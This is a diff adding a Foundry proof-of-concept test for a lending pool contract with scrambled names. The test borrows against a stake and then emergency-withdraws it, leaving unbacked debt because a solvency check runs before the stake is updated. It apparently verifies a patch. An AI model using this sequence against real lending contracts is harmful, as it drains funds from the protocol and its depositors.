@@ -1,0 +1,25 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+/// @notice PoC: passes on the ORIGINAL pool, fails on the PATCHED one.
+///         Borrow against the stake, then emergency-withdraw the stake.
+///         The pre-update solvency check still sees the old collateral.
+contract PocTest is Test {
+    Czz internal pool;
+
+    function setUp() public {
+        pool = new Czz();
+    }
+
+    function test_emergencyWithdrawLeavesBadDebt() public {
+        pool.fzzDeposit(1000);
+        pool.fzzBorrow(950);
+        pool.fzzEmergency(1000);
+        assertEq(pool.vzzStake(address(this)), 0, "stake withdrawn");
+        assertEq(pool.vzzDebt(address(this)), 950, "debt survived the withdrawal");
+        assertFalse(pool.fzzSolvent(address(this)), "position is no longer solvent");
+    }
+}
